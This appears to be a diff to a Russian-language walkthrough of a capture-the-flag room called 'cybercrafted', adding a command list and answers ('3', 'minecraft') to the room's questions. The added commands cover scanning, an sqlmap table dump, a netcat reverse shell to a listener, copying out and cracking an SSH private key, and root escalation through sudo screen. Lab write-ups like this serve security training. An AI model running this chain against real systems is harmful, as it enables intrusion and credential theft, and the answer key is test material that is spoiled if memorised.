@@ -21,9 +21,29 @@ Go
 ### Ответьте на вопросы ниже
 Сколько портов открыто?
 ```commandline
+nmap -T5  <IP>
+dirsearch  -u <IP>
+echo ‘<IP>    cybercrafted.thm’  >> /etc/hosts
+dirsearch -u http://admin.cybercrafted.thm/
+dirsearch -u http://store.cybercrafted.thm/
+sqlmap -r req.req --dbms=mysql -D webapp -T admin –dump
+id
+rm f;mkfifo f;cat f|/bin/sh -i 2>&1|nc <IP> 4444 > f
+scp id_rsa root@<IP>:/root/trytohackme/cybercraft/
+ssh2john id_rsa > id_rsa.hash
+john id_rsa.hash -wordlist=/usr/share/wordlists/rockyou.txt
+su cybercrafted
+sudo -l
+sudo /usr/bin/screen -r cybercrafted
+
+```
+```commandline
 3
 ```
 Какая служба работает на самом высоком порту?
+```commandline
+
+```
 ```commandline
 minecraft
 ```
